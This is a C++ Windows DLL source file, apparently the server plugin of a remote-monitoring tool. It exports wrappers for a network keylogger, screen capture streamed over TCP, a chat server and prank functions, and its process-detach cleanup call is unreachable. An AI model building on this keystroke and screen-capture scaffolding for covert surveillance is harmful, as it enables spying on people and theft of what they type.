
#pragma once

#include "stdafx.h"

#include <TCHAR.H>
#include <stdio.h>
#include <math.h>
#include <Mmsystem.h>
#include <winsock2.h>


#include "resource.h"

#include "WinMonitorGenericLib.h"
#include "FunPlugin.h"
#include "Globals.h"
#include "ScreenMonitor.h"
#include "ChatServer.h"
#include "OnLineKeyLogger.h"
#include "WinMonitorServerPlugin.h"

bool CleanUpAll(void);

BOOL APIENTRY DllMain(HANDLE hModule,DWORD  ul_reason_4_call,LPVOID lpReserved)
{
	gbl_hinstCurrentInstance=(HMODULE)hModule;

	switch (ul_reason_4_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH: break;

		case DLL_PROCESS_DETACH:break; CleanUpAll();
		
	}
    return true;
}


bool SetPrivateHeap(HANDLE &HndToHeap)
{
	return CGeneralMemoryUtility::SetLocalHeap((HANDLE&) HndToHeap); 
}

bool SetCmdShowType(int intType)
{
	gbl_intWndShowType=intType;
	return true;
}

bool CleanUpAll(void)
{
	COnlineKeyLoggerCollection::ClearAll();
	CChatServer::ClearChatClients(); 
	return true;
}

//------------------Fun plugin

UINT64 RegisterAsFunPluginClient(void)
{
	return (UINT64) new CWinMonitorFunPlugin(); 
}

bool UnRegisterAsFunPluginClient(UINT64 Address)
{
	if(Address)
		try { delete (CWinMonitorFunPlugin*) Address; }
		catch(...) { return false; }
	
	return true;
}

//------------------Fun keyboard plugin

bool StartOrStopKeyBoardFunPlugin(UINT64 Address,bool IsStart)
{
	if(!Address) return false;
	try
	{
		if(IsStart)
			return ((CWinMonitorFunPlugin*) Address)->StartKeyBoardPlugin(); 
		else
			return ((CWinMonitorFunPlugin*) Address)->StopKeyBoardPlugin(); 

	}
	catch(...)
	{
		return false;
	}
}

bool OpenOrCloseCDRom(UINT64 Address,bool IsOpen)
{
	if(!Address) return false;
	try
	{
		if(IsOpen)
			return ((CWinMonitorFunPlugin*) Address)->OpenCDRom();
		else
			return ((CWinMonitorFunPlugin*) Address)->CloseCDRom(); 

	}
	catch(...)
	{
		return false;
	}
}

//----------------Screen Monitor user

UINT64  RegisterScreenMonitorUser(CScreenMonitorBase *m_ptrToSmonitor) 
{
	return (UINT64 ) m_ptrToSmonitor;
}

UINT64 RegisterAsScreenMonitorUser(BYTE Compression)
{
	CScreenMonitorBase *m_ptrToSmonitor=new CScreenMonitorBase(Compression); 
	return RegisterScreenMonitorUser(m_ptrToSmonitor);
}

bool RemoveScreenMonitorUser(UINT64  Address)
{
	try
	{
			CScreenMonitorBase *m_ptrToSmonitor=(CScreenMonitorBase*)Address; 
			if(m_ptrToSmonitor) try { delete m_ptrToSmonitor; } catch(...) {}
	}
	catch(...) { return false;}
	return true;
}

CScreenMonitorBase *GetScreenMonitorByAddress(UINT64  Address)
{
	 try
	 {
		CScreenMonitorBase *m_ptrToSmonitor=(CScreenMonitorBase*)Address; 
  		return m_ptrToSmonitor;
	 }
	 catch(...) { return 0; }
}

bool SetCompressionOrType(UINT64  Address,BYTE TypeOrCompression,bool IsType)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) 
	{
		if(!IsType)	return m_ptrToSmonitor->SetCompression(TypeOrCompression);
		else        return m_ptrToSmonitor->SetType(TypeOrCompression);
	}
	else return false;
}

UINT32 ScreenMonitorWriteToNetworkByteStream(UINT64  Address,BYTE* &OutByteStream)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->WriteToNetworkByteStream(OutByteStream);
	else return false;
}

UINT32 ScreenMonitorReadFromNetworkByteStream(UINT64  Address,BYTE *InByteStream)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->ReadFromNetworkByteStream(InByteStream);
	else return false;
}

bool   CaptureOrReplaceDesktopOrWindowImage(UINT64 Address,bool IsCapture,bool IsDesktop,HWND hWnd)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor)
		if(IsCapture)
			if(IsDesktop) return m_ptrToSmonitor->CaptureDesktopImage();
			else          return m_ptrToSmonitor->CaptureWindowImage(hWnd);
		else
			if(IsDesktop) return m_ptrToSmonitor->ReplaceDesktopImage();
			else          return m_ptrToSmonitor->ReplaceWindowImage(hWnd);

	else return false;
}

bool LoadOrSaveImage(UINT64 Address,bool IsLoad,bool IsCompress,TCHAR *FileName)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor)
			if(IsLoad)    return m_ptrToSmonitor->LoadBitmapFromFile(FileName,IsCompress); 
			else          return m_ptrToSmonitor->SaveBitmapToFile(FileName,IsCompress);
	else return false;
}

/*-----------Chat Server Functions-------------*/


UINT64 RegisterAsChatServer(void)
{
	return (UINT64) new CChatServer();
}

bool   RemoveChatServer(UINT64  Address)
{
	if(Address)
		try { delete (CChatServer*) Address; }
		catch(...) { return false; }
	
	return true;
}

bool   ServiceChatClient(UINT64  Address,CTcpNwMonitorConnection TcpConnection)
{
	if(!Address) return false;
	try
	{
		return ((CChatServer*) Address)->ServiceChatClient(TcpConnection); 
	}
	catch(...)
	{
		return false;
	}
}

/*-----------On Line KeyLogger Function--------*/

bool AddOnLineKeyLoggerClient(CTcpNwMonitorConnection TcpConnection)
{
	return COnlineKeyLoggerCollection::AddKeyLoggerClient(TcpConnection); 
}